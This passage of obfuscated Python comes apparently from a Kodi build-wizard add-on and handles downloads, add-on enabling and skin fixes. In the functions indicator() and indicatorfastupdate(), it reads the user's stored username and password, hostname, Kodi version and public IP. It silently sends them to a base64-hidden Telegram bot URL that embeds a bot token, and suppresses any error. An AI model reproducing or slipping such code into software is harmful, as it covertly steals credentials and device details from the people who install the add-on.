        O0OOO0O00OOOOOO0O =int (O0OOO0O00OOOOOO0O )#line:3451
  OO00OOO0O0OO0OO00 =0 #line:3453
  OOO00OO0000000O0O =time .time ()#line:3454
  while True :#line:3455
        OOOO0O00OOO0OO000 =OOOOO00000000OO0O .read (8192 )#line:3456
        if not OOOO0O00OOO0OO000 :#line:3457
            sys .stdout .write ('\n')#line:3458
            break #line:3459
        OO00OOO0O0OO0OO00 +=len (OOOO0O00OOO0OO000 )#line:3461
        O0OO00OO0OO000000 .write (OOOO0O00OOO0OO000 )#line:3462
        if not OOOOOOOO0OO00OO00 :#line:3464
            O0OOO0O00OOOOOO0O =OO00OOO0O0OO0OO00 #line:3465
        if O0OOO00O00OO00000 .iscanceled ():#line:3466
           O0OOO00O00OO00000 .close ()#line:3467
           try :#line:3468
            os .remove (OOO0OOOOOOO0OO00O )#line:3469
           except :#line:3470
            pass #line:3471
           break #line:3472
        O0O0O0O0O0O00OO0O =float (OO00OOO0O0OO0OO00 )/O0OOO0O00OOOOOO0O #line:3473
        O0O0O0O0O0O00OO0O =round (O0O0O0O0O0O00OO0O *100 ,2 )#line:3474
        OOO000OOO00OOOO0O =OO00OOO0O0OO0OO00 /(1024 *1024 )#line:3475
        OOOOOOO0OO0O00OO0 =O0OOO0O00OOOOOO0O /(1024 *1024 )#line:3476
        OO00OOO00O0O0O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO000OOO00OOOO0O ,'teal',OOOOOOO0OO0O00OO0 )#line:3477
        if (time .time ()-OOO00OO0000000O0O )>0 :#line:3478
          O000OOO00OOOOOO0O =OO00OOO0O0OO0OO00 /(time .time ()-OOO00OO0000000O0O )#line:3479
          O000OOO00OOOOOO0O =O000OOO00OOOOOO0O /1024 #line:3480
        else :#line:3481
         O000OOO00OOOOOO0O =0 #line:3482
        O000OOO0O00OOOOOO ='KB'#line:3483
        if O000OOO00OOOOOO0O >=1024 :#line:3484
           O000OOO00OOOOOO0O =O000OOO00OOOOOO0O /1024 #line:3485
           O000OOO0O00OOOOOO ='MB'#line:3486
        if O000OOO00OOOOOO0O >0 and not O0O0O0O0O0O00OO0O ==100 :#line:3487
            OOOO0O0O0O0OOOOO0 =(O0OOO0O00OOOOOO0O -OO00OOO0O0OO0OO00 )/O000OOO00OOOOOO0O #line:3488
        else :#line:3489
            OOOO0O0O0O0OOOOO0 =0 #line:3490
        O00OO0OOO000O0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OOO00OOOOOO0O ,O000OOO0O00OOOOOO )#line:3491
        O0OOO00O00OO00000 .update (int (O0O0O0O0O0O00OO0O ),"Downloading "+name ,OO00OOO00O0O0O0OO ,O00OO0OOO000O0OOO )#line:3493
  O0OO00OOOOO00OO0O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3496
  O0OO00OO0OO000000 .close ()#line:3498
  extract (OOO0OOOOOOO0OO00O ,O0OO00OOOOO00OO0O ,O0OOO00O00OO00000 )#line:3500
  if os .path .exists (O0OO00OOOOO00OO0O +'/scakemyer-script.quasar.burst'):#line:3501
    if os .path .exists (O0OO00OOOOO00OO0O +'/script.quasar.burst'):#line:3502
     shutil .rmtree (O0OO00OOOOO00OO0O +'/script.quasar.burst',ignore_errors =False )#line:3503
    os .rename (O0OO00OOOOO00OO0O +'/scakemyer-script.quasar.burst',O0OO00OOOOO00OO0O +'/script.quasar.burst')#line:3504
  if os .path .exists (O0OO00OOOOO00OO0O +'/plugin.video.kmediatorrent-master'):#line:3506
    if os .path .exists (O0OO00OOOOO00OO0O +'/plugin.video.kmediatorrent'):#line:3507
     shutil .rmtree (O0OO00OOOOO00OO0O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3508
    os .rename (O0OO00OOOOO00OO0O +'/plugin.video.kmediatorrent-master',O0OO00OOOOO00OO0O +'/plugin.video.kmediatorrent')#line:3509
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3510
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3511
  try :#line:3512
    os .remove (OOO0OOOOOOO0OO00O )#line:3513
  except :#line:3514
    pass #line:3515
  O0OOO00O00OO00000 .close ()#line:3516
def dis_or_enable_addon (O0O0O000O00OOOOO0 ,OO00O0000OO00OOOO ,enable ="true"):#line:3517
    import json #line:3518
    O000000000OO000OO ='"%s"'%O0O0O000O00OOOOO0 #line:3519
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0O000O00OOOOO0 )and enable =="true":#line:3520
        logging .warning ('already Enabled')#line:3521
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O0O000O00OOOOO0 )#line:3522
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O0O000O00OOOOO0 )and enable =="false":#line:3523
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O0O000O00OOOOO0 )#line:3524
    else :#line:3525
        O0OO0OO000OO0O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000000000OO000OO ,enable )#line:3526
        O0OOOOOO0O0000000 =xbmc .executeJSONRPC (O0OO0OO000OO0O000 )#line:3527
        O000O00O0O0O0O000 =json .loads (O0OOOOOO0O0000000 )#line:3528
        if enable =="true":#line:3529
            xbmc .log ("### Enabled %s, response = %s"%(O0O0O000O00OOOOO0 ,O000O00O0O0O0O000 ))#line:3530
        else :#line:3531
            xbmc .log ("### Disabled %s, response = %s"%(O0O0O000O00OOOOO0 ,O000O00O0O0O0O000 ))#line:3532
    if OO00O0000OO00OOOO =='auto':#line:3533
     return True #line:3534
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3535
def chunk_report (O0OO0OOO00O00OOOO ,OOO0O00000O00OOOO ,O0O0O0O0000O00O00 ):#line:3536
   O0OO0O00OOOOOOOO0 =float (O0OO0OOO00O00OOOO )/O0O0O0O0000O00O00 #line:3537
   O0OO0O00OOOOOOOO0 =round (O0OO0O00OOOOOOOO0 *100 ,2 )#line:3538
   if O0OO0OOO00O00OOOO >=O0O0O0O0000O00O00 :#line:3540
      sys .stdout .write ('\n')#line:3541
def chunk_read (O00OOO0000OOO00O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3543
   import time #line:3544
   O0O0OOOOO0OO0O00O =int (filesize )*1000000 #line:3545
   OOO0O0OOOOO0O0OO0 =0 #line:3547
   OOOO00O00OOO0OO00 =time .time ()#line:3548
   OO00O0OOO0O0OOO00 =0 #line:3549
   logging .warning ('Downloading')#line:3551
   with open (destination ,"wb")as O0OOOO00000OO00OO :#line:3552
    while 1 :#line:3553
      O0O000O00O00OOO00 =time .time ()-OOOO00O00OOO0OO00 #line:3554
      OOO0OOO0OO0O0O0O0 =int (OO00O0OOO0O0OOO00 *chunk_size )#line:3555
      OO0OOO00OOOO0O000 =O00OOO0000OOO00O0 .read (chunk_size )#line:3556
      O0OOOO00000OO00OO .write (OO0OOO00OOOO0O000 )#line:3557
      O0OOOO00000OO00OO .flush ()#line:3558
      OOO0O0OOOOO0O0OO0 +=len (OO0OOO00OOOO0O000 )#line:3559
      OO00OOOO00OO0O000 =float (OOO0O0OOOOO0O0OO0 )/O0O0OOOOO0OO0O00O #line:3560
      OO00OOOO00OO0O000 =round (OO00OOOO00OO0O000 *100 ,2 )#line:3561
      if int (O0O000O00O00OOO00 )>0 :#line:3562
        O0O0O0000OOO00O00 =int (OOO0OOO0OO0O0O0O0 /(1024 *O0O000O00O00OOO00 ))#line:3563
      else :#line:3564
         O0O0O0000OOO00O00 =0 #line:3565
      if O0O0O0000OOO00O00 >1024 and not OO00OOOO00OO0O000 ==100 :#line:3566
          OO0O00OOOO0O00O00 =int (((O0O0OOOOO0OO0O00O -OOO0OOO0OO0O0O0O0 )/1024 )/(O0O0O0000OOO00O00 ))#line:3567
      else :#line:3568
          OO0O00OOOO0O00O00 =0 #line:3569
      if OO0O00OOOO0O00O00 <0 :#line:3570
        OO0O00OOOO0O00O00 =0 #line:3571
      dp .update (int (OO00OOOO00OO0O000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OOOO00OO0O000 ,OOO0OOO0OO0O0O0O0 /(1024 *1024 ),O0O0OOOOO0OO0O00O /(1000 *1000 ),O0O0O0000OOO00O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0O00OOOO0O00O00 ,60 ))#line:3572
      if dp .iscanceled ():#line:3573
         dp .close ()#line:3574
         break #line:3575
      if not OO0OOO00OOOO0O000 :#line:3576
         break #line:3577
      if report_hook :#line:3579
         report_hook (OOO0O0OOOOO0O0OO0 ,chunk_size ,O0O0OOOOO0OO0O00O )#line:3580
      OO00O0OOO0O0OOO00 +=1 #line:3581
   logging .warning ('END Downloading')#line:3582
   return OOO0O0OOOOO0O0OO0 #line:3583
def googledrive_download (OO00O0OO0O0OOO000 ,OOOOOO0000OO0OO00 ,OOOOOO00000000OOO ,O0O0000OO0OO00OO0 ):#line:3585
    OO0OO000O00O000O0 =[]#line:3589
    O0O00O0OOO000OO0O =OO00O0OO0O0OOO000 .split ('=')#line:3590
    OO00O0OO0O0OOO000 =O0O00O0OOO000OO0O [len (O0O00O0OOO000OO0O )-1 ]#line:3591
    def OOO00O000OO0OOO0O (OO0OO0O0000O0OOO0 ):#line:3593
        for O0OO0O0OO00OOO000 in OO0OO0O0000O0OOO0 :#line:3595
            logging .warning ('cookie.name')#line:3596
            logging .warning (O0OO0O0OO00OOO000 .name )#line:3597
            OO000O00O0O00OO0O =O0OO0O0OO00OOO000 .value #line:3598
            if 'download_warning'in O0OO0O0OO00OOO000 .name :#line:3599
                logging .warning (O0OO0O0OO00OOO000 .value )#line:3600
                logging .warning ('cookie.value')#line:3601
                return O0OO0O0OO00OOO000 .value #line:3602
            return OO000O00O0O00OO0O #line:3603
        return None #line:3605
    def O00O0O0OOOO0OOO0O (OOOOO0O00O00OOOOO ,O0OO0O00O0O0O00O0 ):#line:3607
        OO0O00000000O00OO =32768 #line:3609
        OOO00O00000OOOO0O =time .time ()#line:3610
        with open (O0OO0O00O0O0O00O0 ,"wb")as OO0OOOO000OO000O0 :#line:3612
            OO0O0OOO000OO0OO0 =1 #line:3613
            OO00OO00OOO0O000O =32768 #line:3614
            try :#line:3615
                O0000000000OO0OOO =int (OOOOO0O00O00OOOOO .headers .get ('content-length'))#line:3616
                print ('file total size :',O0000000000OO0OOO )#line:3617
            except TypeError :#line:3618
                print ('using dummy length !!!')#line:3619
                O0000000000OO0OOO =int (O0O0000OO0OO00OO0 )*1000000 #line:3620
            for O000O0O0O0O0O00O0 in OOOOO0O00O00OOOOO .iter_content (OO0O00000000O00OO ):#line:3621
                if O000O0O0O0O0O00O0 :#line:3622
                    OO0OOOO000OO000O0 .write (O000O0O0O0O0O00O0 )#line:3623
                    OO0OOOO000OO000O0 .flush ()#line:3624
                    O0O0OOOO000O0O0O0 =time .time ()-OOO00O00000OOOO0O #line:3625
                    OO000O0OOO0000OO0 =int (OO0O0OOO000OO0OO0 *OO00OO00OOO0O000O )#line:3626
                    if O0O0OOOO000O0O0O0 ==0 :#line:3627
                        O0O0OOOO000O0O0O0 =0.1 #line:3628
                    OO00O0O0O0OO0O0O0 =int (OO000O0OOO0000OO0 /(1024 *O0O0OOOO000O0O0O0 ))#line:3629
                    OO0000OOOOO0000OO =int (OO0O0OOO000OO0OO0 *OO00OO00OOO0O000O *100 /O0000000000OO0OOO )#line:3630
                    if OO00O0O0O0OO0O0O0 >1024 and not OO0000OOOOO0000OO ==100 :#line:3631
                      O0OOO0O00OO0O000O =int (((O0000000000OO0OOO -OO000O0OOO0000OO0 )/1024 )/(OO00O0O0O0OO0O0O0 ))#line:3632
                    else :#line:3633
                      O0OOO0O00OO0O000O =0 #line:3634
                    OOOOOO00000000OOO .update (int (OO0000OOOOO0000OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0000OOOOO0000OO ,OO000O0OOO0000OO0 /(1024 *1024 ),O0000000000OO0OOO /(1000 *1000 ),OO00O0O0O0OO0O0O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OOO0O00OO0O000O ,60 ))#line:3636
                    OO0O0OOO000OO0OO0 +=1 #line:3637
                    if OOOOOO00000000OOO .iscanceled ():#line:3638
                     OOOOOO00000000OOO .close ()#line:3639
                     break #line:3640
    O0O0000OO0OOO0O0O ="https://docs.google.com/uc?export=download"#line:3641
    import urllib2 #line:3646
    import cookielib #line:3647
    from cookielib import CookieJar #line:3649
    OOO0OOO00000000OO =CookieJar ()#line:3651
    O00OO0O000O00O0O0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OOO0OOO00000000OO ))#line:3652
    O0OO0O000OO000OOO ={'id':OO00O0OO0O0OOO000 }#line:3654
    OO0O0OO00O0OOO00O =urllib .urlencode (O0OO0O000OO000OOO )#line:3655
    logging .warning (O0O0000OO0OOO0O0O +'&'+OO0O0OO00O0OOO00O )#line:3656
    O0000000O00O0O0OO =O00OO0O000O00O0O0 .open (O0O0000OO0OOO0O0O +'&'+OO0O0OO00O0OOO00O )#line:3657
    OOO0OO0O0OOOOO0OO =O0000000O00O0O0OO .read ()#line:3658
    for OOO00OOOO0OOO0O0O in OOO0OOO00000000OO :#line:3660
         logging .warning (OOO00OOOO0OOO0O0O )#line:3661
    O0OO00O0OOO000O0O =OOO00O000OO0OOO0O (OOO0OOO00000000OO )#line:3662
    logging .warning (O0OO00O0OOO000O0O )#line:3663
    if O0OO00O0OOO000O0O :#line:3664
        O0OOOOOOO0O0OO0OO ={'id':OO00O0OO0O0OOO000 ,'confirm':O0OO00O0OOO000O0O }#line:3665
        O00O000OO0OO0O0OO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3666
        OO0O0OO00O0OOO00O =urllib .urlencode (O0OOOOOOO0O0OO0OO )#line:3667
        O0000000O00O0O0OO =O00OO0O000O00O0O0 .open (O0O0000OO0OOO0O0O +'&'+OO0O0OO00O0OOO00O )#line:3668
        chunk_read (O0000000O00O0O0OO ,report_hook =chunk_report ,dp =OOOOOO00000000OOO ,destination =OOOOOO0000OO0OO00 ,filesize =O0O0000OO0OO00OO0 )#line:3669
    return (OO0OO000O00O000O0 )#line:3673
def kodi17Fix ():#line:3674
	OOOOO0OO00O00O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3675
	O0O0O00OOOO0OOOOO =[]#line:3676
	for O0OO00OOO000O00O0 in sorted (OOOOO0OO00O00O000 ,key =lambda OOOO0000OOO000O00 :OOOO0000OOO000O00 ):#line:3677
		OOOOOOOO0O0OO0O0O =os .path .join (O0OO00OOO000O00O0 ,'addon.xml')#line:3678
		if os .path .exists (OOOOOOOO0O0OO0O0O ):#line:3679
			O00O0O0O00000O0O0 =O0OO00OOO000O00O0 .replace (ADDONS ,'')[1 :-1 ]#line:3680
			O0O0O0O00OO00OOO0 =open (OOOOOOOO0O0OO0O0O )#line:3681
			O00OOOOO000000O00 =O0O0O0O00OO00OOO0 .read ()#line:3682
			OOOOOO00O0OO0O0OO =parseDOM (O00OOOOO000000O00 ,'addon',ret ='id')#line:3683
			O0O0O0O00OO00OOO0 .close ()#line:3684
			try :#line:3685
				OO0000OO000OOOOO0 =xbmcaddon .Addon (id =OOOOOO00O0OO0O0OO [0 ])#line:3686
			except :#line:3687
				try :#line:3688
					log ("%s was disabled"%OOOOOO00O0OO0O0OO [0 ],xbmc .LOGDEBUG )#line:3689
					O0O0O00OOOO0OOOOO .append (OOOOOO00O0OO0O0OO [0 ])#line:3690
				except :#line:3691
					try :#line:3692
						log ("%s was disabled"%O00O0O0O00000O0O0 ,xbmc .LOGDEBUG )#line:3693
						O0O0O00OOOO0OOOOO .append (O00O0O0O00000O0O0 )#line:3694
					except :#line:3695
						if len (OOOOOO00O0OO0O0OO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O0O0O00000O0O0 ,xbmc .LOGERROR )#line:3696
						else :log ("Unabled to enable: %s"%O0OO00OOO000O00O0 ,xbmc .LOGERROR )#line:3697
	if len (O0O0O00OOOO0OOOOO )>0 :#line:3698
		O00OOOOOOO0O00O00 =0 #line:3699
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3700
		for O0O0OOOOOO0000O0O in O0O0O00OOOO0OOOOO :#line:3701
			O00OOOOOOO0O00O00 +=1 #line:3702
			OO00OO00000000O00 =int (percentage (O00OOOOOOO0O00O00 ,len (O0O0O00OOOO0OOOOO )))#line:3703
			DP .update (OO00OO00000000O00 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OOOOOO0000O0O ))#line:3704
			addonDatabase (O0O0OOOOOO0000O0O ,1 )#line:3705
			if DP .iscanceled ():break #line:3706
		if DP .iscanceled ():#line:3707
			DP .close ()#line:3708
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3709
			sys .exit ()#line:3710
		DP .close ()#line:3711
	forceUpdate ()#line:3712
def indicator ():#line:3714
       try :#line:3715
          import json #line:3716
          wiz .log ('FRESH MESSAGE')#line:3717
          OOOOO000OO00O0O0O =(ADDON .getSetting ("user"))#line:3718
          O0000O00OO00OO00O =(ADDON .getSetting ("pass"))#line:3719
          OOOOOOOOOO00OOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3720
          OOO0OO000OOOOO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3721
          O0OO0OO0OOOO0O00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3722
          O0O000O0OO0OO0O00 =str (json .loads (O0OO0OO0OOOO0O00O )['ip'])#line:3723
          O00000000000000OO =OOOOO000OO00O0O0O #line:3724
          O0OOOOOO0OO00OOOO =O0000O00OO00OO00O #line:3725
          import socket #line:3726
          O0OO0OO0OOOO0O00O =urllib2 .urlopen (OOO0OO000OOOOO0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00000000000000OO +' - '+O0OOOOOO0OO00OOOO +' - '+OOOOOOOOOO00OOO00 +' - '+O0O000O0OO0OO0O00 ).readlines ()#line:3727
       except :pass #line:3729
def indicatorfastupdate ():#line:3731
       try :#line:3732
          import json #line:3733
          wiz .log ('FRESH MESSAGE')#line:3734
          O00000OOOO0000OOO =(ADDON .getSetting ("user"))#line:3735
          O0O00O0O00OOOO0OO =(ADDON .getSetting ("pass"))#line:3736
          OOOO0000O0OO00OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3737
          O00OO0O0O0O0O0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3739
          O00OOO00O0OO00O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3740
          O0OOOO0000O00O0O0 =str (json .loads (O00OOO00O0OO00O00 )['ip'])#line:3741
          O0000O000OOO00O00 =O00000OOOO0000OOO #line:3742
          O0OOO00OO0OO00OO0 =O0O00O0O00OOOO0OO #line:3743
          import socket #line:3745
          O00OOO00O0OO00O00 =urllib2 .urlopen (O00OO0O0O0O0O0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0000O000OOO00O00 +' - '+O0OOO00OO0OO00OO0 +' - '+OOOO0000O0OO00OOO +' - '+O0OOOO0000O00O0O0 ).readlines ()#line:3746
       except :pass #line:3748
def skinfix18 ():#line:3750
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3751
		O00OOOOO0O0OO0O0O =wiz .workingURL (SKINID18DDONXML )#line:3752
		if O00OOOOO0O0OO0O0O ==True :#line:3753
			O00OOO0O00000000O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3754
			if len (O00OOO0O00000000O )>0 :#line:3755
				O0O0OO0OOO0OO000O ='%s-%s.zip'%(SKINID18 ,O00OOO0O00000000O [0 ])#line:3756
				O000OO0OOO00O000O =wiz .workingURL (SKIN18ZIPURL +O0O0OO0OOO0OO000O )#line:3757
				if O000OO0OOO00O000O ==True :#line:3758
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3759
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3760
					OO0OOO000O0O00OO0 =os .path .join (PACKAGES ,O0O0OO0OOO0OO000O )#line:3761
					try :os .remove (OO0OOO000O0O00OO0 )#line:3762
					except :pass #line:3763
					downloader .download (SKIN18ZIPURL +O0O0OO0OOO0OO000O ,OO0OOO000O0O00OO0 ,DP )#line:3764
					extract .all (OO0OOO000O0O00OO0 ,HOME ,DP )#line:3765
					try :#line:3766
						OOO0OO0OOOOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3767
						OO0O0OO00O000OOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3768
						os .rename (OOO0OO0OOOOOOO0OO ,OO0O0OO00O000OOOO )#line:3769
					except :#line:3770
						pass #line:3771
					try :#line:3772
						O00OOO000O0O00OO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO00O00OO00O00O0O =O00OOO000O0O00OO0 .read ();O00OOO000O0O00OO0 .close ()#line:3773
						O00O0OO0OO00O0000 =wiz .parseDOM (OO00O00OO00O00O0O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3774
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0OO0OO00O0000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3775
					except :#line:3776
						pass #line:3777
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3778
					DP .close ()#line:3779
					xbmc .sleep (500 )#line:3780
					wiz .forceUpdate (True )#line:3781
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3782
				else :#line:3783
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3784
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000OO0OOO00O000O ,xbmc .LOGERROR )#line:3785
			else :#line:3786
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3787
		else :#line:3788
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3789
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3790
def skinfix17 ():#line:3791
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3792
		OO00OOO0O00O000O0 =wiz .workingURL (SKINID17DDONXML )#line:3793
		if OO00OOO0O00O000O0 ==True :#line:3794
			O0OO0OO00O0OOO000 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3795
			if len (O0OO0OO00O0OOO000 )>0 :#line:3796
				O000OO0000OOOOO00 ='%s-%s.zip'%(SKINID17 ,O0OO0OO00O0OOO000 [0 ])#line:3797
				O00OO000O00O0000O =wiz .workingURL (SKIN17ZIPURL +O000OO0000OOOOO00 )#line:3798
				if O00OO000O00O0000O ==True :#line:3799
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3800
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3801
					OOOO0OO0OO000O000 =os .path .join (PACKAGES ,O000OO0000OOOOO00 )#line:3802
					try :os .remove (OOOO0OO0OO000O000 )#line:3803
					except :pass #line:3804
					downloader .download (SKIN17ZIPURL +O000OO0000OOOOO00 ,OOOO0OO0OO000O000 ,DP )#line:3805
					extract .all (OOOO0OO0OO000O000 ,HOME ,DP )#line:3806
					try :#line:3807
						O000OOOOOO00O0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3808
						O0OOOOO0OOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3809
						os .rename (O000OOOOOO00O0OOO ,O0OOOOO0OOOOOOOOO )#line:3810
					except :#line:3811
						pass #line:3812
					try :#line:3813
						O0O00O0O00O0OOOOO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0O00000OOO0000O =O0O00O0O00O0OOOOO .read ();O0O00O0O00O0OOOOO .close ()#line:3814
						OO0OO000O00O0OO00 =wiz .parseDOM (OO0O00000OOO0000O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3815
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO000O00O0OO00 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3816
					except :#line:3817
						pass #line:3818
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3819
					DP .close ()#line:3820
					xbmc .sleep (500 )#line:3821
					wiz .forceUpdate (True )#line:3822
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3823
				else :#line:3824
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3825
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00OO000O00O0000O ,xbmc .LOGERROR )#line:3826
			else :#line:3827
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3828
		else :#line:3829
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3830
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3831
def fix17update ():#line:3832
	if KODIV >=17 and KODIV <18 :#line:3833
		wiz .kodi17Fix ()#line:3834
		xbmc .sleep (4000 )#line:3835
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3836
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3837
		fixfont ()#line:3838
		OO0O0O0OOOO00000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3839
		try :#line:3841
			O0O0O0O00000OOO00 =open (OO0O0O0OOOO00000O ,'r')#line:3842
			O0O0O00O0O00O0OO0 =O0O0O0O00000OOO00 .read ()#line:3843
			O0O0O0O00000OOO00 .close ()#line:3844
			O00OO00OO00000OOO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3845
			O0000OOO00OO00000 =re .compile (O00OO00OO00000OOO ).findall (O0O0O00O0O00O0OO0 )[0 ]#line:3846
			O0O0O0O00000OOO00 =open (OO0O0O0OOOO00000O ,'w')#line:3847
			O0O0O0O00000OOO00 .write (O0O0O00O0O00O0OO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0000OOO00OO00000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3848
			O0O0O0O00000OOO00 .close ()#line:3849
		except :#line:3850
				pass #line:3851
		wiz .kodi17Fix ()#line:3852
		OO0O0O0OOOO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3853
		try :#line:3854
			O0O0O0O00000OOO00 =open (OO0O0O0OOOO00000O ,'r')#line:3855
			O0O0O00O0O00O0OO0 =O0O0O0O00000OOO00 .read ()#line:3856
			O0O0O0O00000OOO00 .close ()#line:3857
			O00OO00OO00000OOO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3858
			O0000OOO00OO00000 =re .compile (O00OO00OO00000OOO ).findall (O0O0O00O0O00O0OO0 )[0 ]#line:3859
			O0O0O0O00000OOO00 =open (OO0O0O0OOOO00000O ,'w')#line:3860
			O0O0O0O00000OOO00 .write (O0O0O00O0O00O0OO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0000OOO00OO00000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3861
			O0O0O0O00000OOO00 .close ()#line:3862
		except :#line:3863
				pass #line:3864
		swapSkins ('skin.Premium.mod')#line:3865
def fix18update ():#line:3867
	if KODIV >=18 :#line:3868
